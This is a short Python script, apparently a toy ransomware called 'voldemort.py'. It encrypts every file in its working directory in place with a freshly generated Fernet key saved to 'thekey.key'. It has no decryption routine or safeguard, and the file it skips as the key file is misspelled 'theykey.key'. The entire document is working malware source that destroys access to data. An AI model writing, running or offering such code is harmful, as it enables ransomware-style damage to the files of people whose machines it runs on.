#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
# let's find the files

files = []

for file in os.listdir():
# let's make sure that the code doesn't encrypt itself or the key that it generates
	if file == "voldemort.py" or file == "theykey.key":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb" ) as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
# open every file in binary mode and read it in binary mode aka 'rb'
		contents = thefile.read()
# let's encrypt the files
	contents_encrypted =Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
